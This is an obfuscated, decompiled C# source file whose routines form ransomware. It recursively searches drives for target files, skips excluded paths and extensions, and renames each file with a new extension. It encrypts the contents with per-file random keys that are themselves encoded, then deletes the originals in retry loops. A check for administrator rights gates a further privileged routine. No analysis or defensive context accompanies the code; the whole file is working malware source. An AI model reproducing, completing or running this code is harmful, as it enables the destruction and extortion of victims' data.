using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using EMdMrSFvVbKEdKGe;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

internal sealed class opmuuofbUtOT
{
	public sealed class BGiHVeGzZvpUqcy
	{
		private static StringCollection YOFTUILvNrk;

		private static List<string> QRIzREZUVRAcV;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107408909));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107408904)) && !text.ToLower().Contains(getString_0(107408851)) && !text.ToLower().Contains(getString_0(107393481)) && !text.ToLower().Contains(getString_0(107393436)) && !text.ToLower().Contains(getString_0(107408870)) && !text.ToLower().Contains(getString_0(107392804)) && !text.ToLower().Contains(getString_0(107392745)) && !text.ToLower().Contains(getString_0(107392696)) && !text.ToLower().Contains(getString_0(107392711)) && !text.ToLower().Contains(getString_0(107392662)) && !text.ToLower().Contains(getString_0(107392628)) && !text.ToLower().Contains(getString_0(107392643)) && !text.ToLower().Contains(getString_0(107393106)) && !text.ToLower().Contains(getString_0(107393125)) && !text.ToLower().Contains(getString_0(107393072)) && !text.ToLower().Contains(getString_0(107393091)) && !text.ToLower().Contains(getString_0(107393046)) && !text.ToLower().Contains(getString_0(107393061)) && !text.ToLower().Contains(getString_0(107393012)) && !text.Contains(HVpeMrZfkFlb(getString_0(107393027))) && !text.Contains(getString_0(107393002)) && !text.Contains(getString_0(107392957)) && !text.EndsWith(getString_0(107395631)) && !text.EndsWith(getString_0(107392964)) && !text.EndsWith(getString_0(107392959)) && !text.EndsWith(getString_0(107392922)) && !text.EndsWith(getString_0(107392917)) && !text.ToLower().Contains(getString_0(107392912)) && !text.ToLower().Contains(PtsBXekLcxalyC))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(SPQmigmjIMVgui) * 1024.0 * 1024.0 && zxNLGOSViKvsF == getString_0(107397210))
							{
								QRIzREZUVRAcV.Add(text);
							}
							else if (File.Exists(text) && zxNLGOSViKvsF == getString_0(107396735))
							{
								QRIzREZUVRAcV.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return QRIzREZUVRAcV;
		}

		static BGiHVeGzZvpUqcy()
		{
			Strings.CreateGetStringDelegate(typeof(BGiHVeGzZvpUqcy));
			YOFTUILvNrk = new StringCollection();
			QRIzREZUVRAcV = new List<string>();
		}
	}

	private sealed class LTHBOLqRKWnP
	{
		public string ubTfaHruMTjL;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == ubTfaHruMTjL;
		}
	}

	private sealed class OyvbXAvPuKBZVsBq
	{
		private sealed class OaASIlSustKwI
		{
			public OyvbXAvPuKBZVsBq BJKxASADiWzk;

			public string YLyBYIjSmFjlgi;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					dsPuSZignq(WindowsIdentity.GetCurrent().Name, YLyBYIjSmFjlgi);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				iXotQZrDUUUCDA(YLyBYIjSmFjlgi, BJKxASADiWzk.FVlFTfmMNpdfGh, BJKxASADiWzk.RBBUEzhzLAxiwSKT, BJKxASADiWzk.OGgGQsTqBlBCq, BJKxASADiWzk.xZOUbJihRtwSVFky);
			}
		}

		public string[] FVlFTfmMNpdfGh;

		public string[] OGgGQsTqBlBCq;

		public string xZOUbJihRtwSVFky;

		public string RBBUEzhzLAxiwSKT;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			OaASIlSustKwI CS_0024_003C_003E8__locals0 = new OaASIlSustKwI();
			CS_0024_003C_003E8__locals0.BJKxASADiWzk = this;
			CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi = string_0;
			if (YddgklTLPM && !HqqBLCvmqImsbDmo().Contains(getString_0(107391566)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						dsPuSZignq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (yOLtwErlSIuUuw == getString_0(107397216))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					iXotQZrDUUUCDA(CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi, CS_0024_003C_003E8__locals0.BJKxASADiWzk.FVlFTfmMNpdfGh, CS_0024_003C_003E8__locals0.BJKxASADiWzk.RBBUEzhzLAxiwSKT, CS_0024_003C_003E8__locals0.BJKxASADiWzk.OGgGQsTqBlBCq, CS_0024_003C_003E8__locals0.BJKxASADiWzk.xZOUbJihRtwSVFky);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				iXotQZrDUUUCDA(CS_0024_003C_003E8__locals0.YLyBYIjSmFjlgi, FVlFTfmMNpdfGh, RBBUEzhzLAxiwSKT, OGgGQsTqBlBCq, xZOUbJihRtwSVFky);
			}
		}

		static OyvbXAvPuKBZVsBq()
		{
			Strings.CreateGetStringDelegate(typeof(OyvbXAvPuKBZVsBq));
		}
	}

	private sealed class ILaHbrWVQTp
	{
		private sealed class SCEyazWNHIl
		{
			public ILaHbrWVQTp TWYyHIKfojzLa;

			public string OlRLvdUaawOGm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in ckZUdJlJosB)
				{
					if (OlRLvdUaawOGm.ToLower().EndsWith(item + TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == getString_0(107397227))
					{
						if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(OlRLvdUaawOGm).Length)
						{
							try
							{
								OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393346), getString_0(107393373), getString_0(107393360), OlRLvdUaawOGm);
							}
							catch
							{
							}
						}
					}
					else if (OlRLvdUaawOGm.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107396752))
					{
						try
						{
							OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393346), getString_0(107393373), getString_0(107393360), OlRLvdUaawOGm);
						}
						catch
						{
						}
					}
				}
			}

			static SCEyazWNHIl()
			{
				Strings.CreateGetStringDelegate(typeof(SCEyazWNHIl));
			}
		}

		private sealed class EXWrPuSgPDt
		{
			public ILaHbrWVQTp TWYyHIKfojzLa;

			public string THbMIWrcVCD;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in ckZUdJlJosB)
				{
					if (THbMIWrcVCD.ToLower().EndsWith(item + TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == getString_0(107397230))
					{
						if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(THbMIWrcVCD).Length)
						{
							try
							{
								OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393349), getString_0(107393376), getString_0(107393363), THbMIWrcVCD);
							}
							catch
							{
							}
						}
					}
					else if (THbMIWrcVCD.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == getString_0(107396755))
					{
						try
						{
							OoPMqxzMoPT.NtFcgKTCMrqXUSQ(getString_0(107393349), getString_0(107393376), getString_0(107393363), THbMIWrcVCD);
						}
						catch
						{
						}
					}
				}
			}

			static EXWrPuSgPDt()
			{
				Strings.CreateGetStringDelegate(typeof(EXWrPuSgPDt));
			}
		}

		public List<string> idwOnWkgJvyiJfZcX;

		public List<string> sNGFtOfLZdgOwtG;

		public string LUAEFZkwQdyp;

		public string[] DdNdQPwYeQCU;

		public string kXRqipnIRdWIwO;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			SCEyazWNHIl CS_0024_003C_003E8__locals0;
			foreach (string item in sNGFtOfLZdgOwtG)
			{
				if (DdNdQPwYeQCU.Length != 0)
				{
					string[] ddNdQPwYeQCU = DdNdQPwYeQCU;
					int num = 0;
					while (num < ddNdQPwYeQCU.Length)
					{
						string value = ddNdQPwYeQCU[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_072e;
					}
				}
				try
				{
					if (item.EndsWith(LUAEFZkwQdyp))
					{
						goto IL_072e;
					}
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				if (!item.EndsWith(string_0) || fpmCyTaZQjAm.Contains(item))
				{
					continue;
				}
				if (LHgKOtaABYHh == getString_0(107397224))
				{
					try
					{
						if (IvkAlWvtyqMeDN.TEOwirmYyFAe(item))
						{
							IvkAlWvtyqMeDN.QvIJJaFwnlbV(item);
						}
					}
					catch
					{
					}
				}
				fpmCyTaZQjAm.Add(item);
				if (!RVpXhPaEOqMSkG.Contains(Path.GetDirectoryName(item)))
				{
					RVpXhPaEOqMSkG.Add(Path.GetDirectoryName(item));
				}
				rMoNmipxFkKw(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (TiKXhRWKbmQI)
						{
							try
							{
								File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + item + getString_0(107408835) + ex2.Message + getString_0(107396602));
							}
							catch (Exception)
							{
							}
						}
						bVOffGsglMxM++;
						goto end_IL_00ee;
					}
					if (hmJvpQlaOPxs == getString_0(107397224) && new FileInfo(item).Length > Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024 && !idwOnWkgJvyiJfZcX.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new SCEyazWNHIl();
						CS_0024_003C_003E8__locals0.TWYyHIKfojzLa = this;
						try
						{
							if (LUAEFZkwQdyp != getString_0(107391447))
							{
								if (hpyULordzdhq)
								{
									LUAEFZkwQdyp = UMHyeHuFiQnSyQ + LUAEFZkwQdyp;
								}
								File.Move(item, item + LUAEFZkwQdyp);
							}
						}
						catch (Exception ex4)
						{
							if (TiKXhRWKbmQI)
							{
								try
								{
									File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + item + getString_0(107408774) + ex4.Message + getString_0(107396602));
								}
								catch (Exception)
								{
								}
							}
							bVOffGsglMxM++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = getString_0(107393294);
						if (LUAEFZkwQdyp != getString_0(107391447))
						{
							CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = item + LUAEFZkwQdyp;
						}
						else
						{
							CS_0024_003C_003E8__locals0.OlRLvdUaawOGm = item;
						}
						if (uCcQuMnxchHHlJ == getString_0(107397224))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in ckZUdJlJosB)
								{
									if (CS_0024_003C_003E8__locals0.OlRLvdUaawOGm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == SCEyazWNHIl.getString_0(107397227))
									{
										if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.OlRLvdUaawOGm).Length)
										{
											try
											{
												OoPMqxzMoPT.NtFcgKTCMrqXUSQ(SCEyazWNHIl.getString_0(107393346), SCEyazWNHIl.getString_0(107393373), SCEyazWNHIl.getString_0(107393360), CS_0024_003C_003E8__locals0.OlRLvdUaawOGm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.OlRLvdUaawOGm.ToLower().EndsWith(item2) && GpxsQQwDuqzSQU == SCEyazWNHIl.getString_0(107396752))
									{
										try
										{
											OoPMqxzMoPT.NtFcgKTCMrqXUSQ(SCEyazWNHIl.getString_0(107393346), SCEyazWNHIl.getString_0(107393373), SCEyazWNHIl.getString_0(107393360), CS_0024_003C_003E8__locals0.OlRLvdUaawOGm);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s = SwirPclUHWNCec.RAWIZpYvlBsHh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = LDPlsTBlRKl.SIHltLKinis(CS_0024_003C_003E8__locals0.OlRLvdUaawOGm, Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024);
						LDPlsTBlRKl.okTfVuvniFE(QdqaaPMDvE: (!aMtbjENTlvGs) ? (hWWikjLPcgd ? LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (hWWikjLPcgd ? XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), jOuMeXrLMdE: CS_0024_003C_003E8__locals0.OlRLvdUaawOGm, WchFjUVPKuFtkL: bytes);
					}
					else
					{
						if (hpyULordzdhq)
						{
							LUAEFZkwQdyp = UMHyeHuFiQnSyQ + LUAEFZkwQdyp;
						}
						string text2 = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s2 = SwirPclUHWNCec.RAWIZpYvlBsHh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (LUAEFZkwQdyp != getString_0(107391447))
						{
							if (!FwNVRjoRuJX)
							{
								if (!hWWikjLPcgd)
								{
									CPTiJxEiqbG(item, item + LUAEFZkwQdyp, GNzSmqEhxfDdOM);
								}
								else
								{
									CPTiJxEiqbG(item, item + LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!hWWikjLPcgd)
									{
										WxPAFRGwcjiPOHT(item, item + LUAEFZkwQdyp, GNzSmqEhxfDdOM);
									}
									else
									{
										WxPAFRGwcjiPOHT(item, item + LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (TiKXhRWKbmQI)
									{
										try
										{
											File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + item + getString_0(107391401) + ex6.Message + getString_0(107396602));
										}
										catch (Exception)
										{
										}
									}
									bVOffGsglMxM++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!FwNVRjoRuJX)
						{
							if (!hWWikjLPcgd)
							{
								CPTiJxEiqbG(item, item + getString_0(107391442), GNzSmqEhxfDdOM);
							}
							else
							{
								CPTiJxEiqbG(item, item + getString_0(107391442), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!hWWikjLPcgd)
								{
									WxPAFRGwcjiPOHT(item, item, GNzSmqEhxfDdOM);
								}
								else
								{
									WxPAFRGwcjiPOHT(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (TiKXhRWKbmQI)
								{
									try
									{
										File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + item + getString_0(107391401) + ex8.Message + getString_0(107396602));
									}
									catch (Exception)
									{
									}
								}
								bVOffGsglMxM++;
								goto end_IL_00ee;
							}
						}
						if (hWWikjLPcgd)
						{
							if (LUAEFZkwQdyp != getString_0(107391447))
							{
								AXWEfwzISuVXUHm(item + LUAEFZkwQdyp, bytes2);
							}
							else
							{
								AXWEfwzISuVXUHm(item, bytes2);
							}
						}
					}
					goto IL_072e;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_072e;
				}
				continue;
				IL_072e:
				sNGFtOfLZdgOwtG.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			EXWrPuSgPDt CS_0024_003C_003E8__locals0 = new EXWrPuSgPDt();
			CS_0024_003C_003E8__locals0.TWYyHIKfojzLa = this;
			CS_0024_003C_003E8__locals0.THbMIWrcVCD = string_0;
			if (DdNdQPwYeQCU.Length != 0)
			{
				string[] ddNdQPwYeQCU = DdNdQPwYeQCU;
				int num = 0;
				while (num < ddNdQPwYeQCU.Length)
				{
					string value = ddNdQPwYeQCU[num];
					if (!CS_0024_003C_003E8__locals0.THbMIWrcVCD.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.EndsWith(LUAEFZkwQdyp))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!fpmCyTaZQjAm.Contains(CS_0024_003C_003E8__locals0.THbMIWrcVCD))
			{
				if (LHgKOtaABYHh == getString_0(107397224))
				{
					try
					{
						if (IvkAlWvtyqMeDN.TEOwirmYyFAe(CS_0024_003C_003E8__locals0.THbMIWrcVCD))
						{
							IvkAlWvtyqMeDN.QvIJJaFwnlbV(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
						}
					}
					catch
					{
					}
				}
				fpmCyTaZQjAm.Add(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
				if (!RVpXhPaEOqMSkG.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.THbMIWrcVCD)))
				{
					RVpXhPaEOqMSkG.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.THbMIWrcVCD));
				}
				rMoNmipxFkKw(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (TiKXhRWKbmQI)
						{
							try
							{
								File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107408835) + ex2.Message + getString_0(107396602));
							}
							catch (Exception)
							{
							}
						}
						bVOffGsglMxM++;
						goto end_IL_0117_2;
					}
					if (hmJvpQlaOPxs == getString_0(107397224) && new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length > Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024)
					{
						try
						{
							if (LUAEFZkwQdyp != getString_0(107391447))
							{
								if (hpyULordzdhq)
								{
									LUAEFZkwQdyp = UMHyeHuFiQnSyQ + LUAEFZkwQdyp;
								}
								File.Move(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp);
							}
						}
						catch (Exception ex4)
						{
							if (TiKXhRWKbmQI)
							{
								try
								{
									File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107408774) + ex4.Message + getString_0(107396602));
								}
								catch (Exception)
								{
								}
							}
							bVOffGsglMxM++;
							return;
						}
						if (LUAEFZkwQdyp != getString_0(107391447))
						{
							CS_0024_003C_003E8__locals0.THbMIWrcVCD += LUAEFZkwQdyp;
						}
						if (uCcQuMnxchHHlJ == getString_0(107397224))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in ckZUdJlJosB)
								{
									if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.TWYyHIKfojzLa.LUAEFZkwQdyp) && GpxsQQwDuqzSQU == EXWrPuSgPDt.getString_0(107397230))
									{
										if (Convert.ToInt32(ThgEusyzIrO) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.THbMIWrcVCD).Length)
										{
											try
											{
												OoPMqxzMoPT.NtFcgKTCMrqXUSQ(EXWrPuSgPDt.getString_0(107393349), EXWrPuSgPDt.getString_0(107393376), EXWrPuSgPDt.getString_0(107393363), CS_0024_003C_003E8__locals0.THbMIWrcVCD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.THbMIWrcVCD.ToLower().EndsWith(item) && GpxsQQwDuqzSQU == EXWrPuSgPDt.getString_0(107396755))
									{
										try
										{
											OoPMqxzMoPT.NtFcgKTCMrqXUSQ(EXWrPuSgPDt.getString_0(107393349), EXWrPuSgPDt.getString_0(107393376), EXWrPuSgPDt.getString_0(107393363), CS_0024_003C_003E8__locals0.THbMIWrcVCD);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s = SwirPclUHWNCec.RAWIZpYvlBsHh(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = LDPlsTBlRKl.SIHltLKinis(CS_0024_003C_003E8__locals0.THbMIWrcVCD, Convert.ToInt32(lULwGORTHsVbwb) * 1024 * 1024);
						LDPlsTBlRKl.okTfVuvniFE(QdqaaPMDvE: (!aMtbjENTlvGs) ? (hWWikjLPcgd ? LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : LDPlsTBlRKl.zJqyRuuOKNq(byte_, Encoding.ASCII.GetBytes(kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (hWWikjLPcgd ? XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : XiKgJtUmrYMpicU.iYGTeDkvafUG(byte_, Encoding.ASCII.GetBytes(kXRqipnIRdWIwO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), jOuMeXrLMdE: CS_0024_003C_003E8__locals0.THbMIWrcVCD, WchFjUVPKuFtkL: bytes);
					}
					else
					{
						if (hpyULordzdhq)
						{
							LUAEFZkwQdyp = UMHyeHuFiQnSyQ + LUAEFZkwQdyp;
						}
						string text2 = lRoqoMlYxFS.qYRjRODTFgsABsxV(32);
						string s2 = SwirPclUHWNCec.RAWIZpYvlBsHh(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (LUAEFZkwQdyp != getString_0(107391447))
						{
							if (!FwNVRjoRuJX)
							{
								if (!hWWikjLPcgd)
								{
									CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp, GNzSmqEhxfDdOM);
								}
								else
								{
									CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!hWWikjLPcgd)
									{
										WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp, GNzSmqEhxfDdOM);
									}
									else
									{
										WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (TiKXhRWKbmQI)
									{
										try
										{
											File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107391401) + ex6.Message + getString_0(107396602));
										}
										catch (Exception)
										{
										}
									}
									bVOffGsglMxM++;
									return;
								}
							}
						}
						else if (!FwNVRjoRuJX)
						{
							if (!hWWikjLPcgd)
							{
								CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107391442), GNzSmqEhxfDdOM);
							}
							else
							{
								CPTiJxEiqbG(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107391442), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!hWWikjLPcgd)
								{
									WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD, GNzSmqEhxfDdOM);
								}
								else
								{
									WxPAFRGwcjiPOHT(CS_0024_003C_003E8__locals0.THbMIWrcVCD, CS_0024_003C_003E8__locals0.THbMIWrcVCD, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (TiKXhRWKbmQI)
								{
									try
									{
										File.AppendAllText(NPfFzxrRnHyw, getString_0(107391196) + CS_0024_003C_003E8__locals0.THbMIWrcVCD + getString_0(107391401) + ex8.Message + getString_0(107396602));
									}
									catch (Exception)
									{
									}
								}
								bVOffGsglMxM++;
								return;
							}
						}
						if (hWWikjLPcgd)
						{
							if (LUAEFZkwQdyp != getString_0(107391447))
							{
								AXWEfwzISuVXUHm(CS_0024_003C_003E8__locals0.THbMIWrcVCD + LUAEFZkwQdyp, bytes2);
							}
							else
							{
								AXWEfwzISuVXUHm(CS_0024_003C_003E8__locals0.THbMIWrcVCD, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_07bb;
			IL_07bb:
			sNGFtOfLZdgOwtG.Remove(CS_0024_003C_003E8__locals0.THbMIWrcVCD);
		}

		static ILaHbrWVQTp()
		{
			Strings.CreateGetStringDelegate(typeof(ILaHbrWVQTp));
		}
	}

	private sealed class cEGWxmeHJaEO
	{
		public string OpWwBEgJloHZa;

		public string KRVZpOwKJSp;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(OpWwBEgJloHZa);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(KRVZpOwKJSp))
					{
						File.Delete(KRVZpOwKJSp);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string LGeZrzTAyQiZ;

	public static byte[] GNzSmqEhxfDdOM;

	public static string zxNLGOSViKvsF;

	public static string SPQmigmjIMVgui;

	public static List<string> HvDislcBmvfwEiZ;

	public static List<string> NcfZxRUWHNhp;

	public static string EiNdgqcqTVoi;

	public static string kXRqipnIRdWIwO;

	public static string eQkgiuFNXIleWNVL;

	public static string FRYGqIQyiT;

	public static int iyTOxLsoiMVpH;

	public static string LHgKOtaABYHh;

	public static string YqfHjDCVzC;

	public static string HssaJUOvJGbgq;

	public static string OcxUzttKCHCEy;

	public static string JmAxKbKLelPxJ;

	public static string hlkaCQLrtXa;

	public static string mFrQbxzEMdalqU;

	public static string VTSwHYDZTQkjt;

	public static List<string> bvTdfKIEWRmqB;

	public static List<string> RVpXhPaEOqMSkG;

	public static string fQxmapBHYBLOfG;

	public static string fPYzRKhyuWBoW;

	public static string kaZaMjdPEXXy;

	public static List<string> fpmCyTaZQjAm;

	public static string YUqmLHcOKx;

	private static string lwzGwXJiBdgk;

	public static string yOLtwErlSIuUuw;

	public static string xJcKVJAUPnxQimi;

	public static List<string> ussIlYOuJVMgKunLO;

	public static List<string> ZiZdlGZQMKRIPJ;

	public static List<string> OuiVTcbGPHuSa;

	public static List<string> KSsRoxGqodAS;

	public static string wbCfMjGPdcW;

	public static List<string> yRBEUVLZlAnEdd;

	public static List<string> hJJkXeuiqGz;

	public static string KCVoFSMpGXKlq;

	public static string dnZRGCoCklSHKY;

	internal static DateTime ZxIIqtiyuAl;

	internal static DateTime OHBfUHlZKqTDcuFxZ;

	public static string hmJvpQlaOPxs;

	public static string lULwGORTHsVbwb;

	public static string kIvaDzqPWp;

	public static string TMkyAWmFLSj;

	public static string LVGmgeLzZF;

	public static string KQCPbXDOxwnSPz;

	public static string LRMGeQPxsQADKTt;

	public static string uCcQuMnxchHHlJ;

	public static List<string> ckZUdJlJosB;

	public static string GpxsQQwDuqzSQU;

	public static string ThgEusyzIrO;

	public static string VshFVTYmyC;

	public static string HfkLRUwddBKMzY;

	public static string BDoKuyssvLAVUQ;

	public static string HqoRxsyhnVRpC;

	public static string gnUszaDrSLDy;

	public static string RpxGQyzSGFE;

	public static string mnelOchnJdlue;

	public static string BlWgBotOUWKVK;

	public static string FGewXxPlePtWzAIc;

	public static string voJHFutcHhirgW;

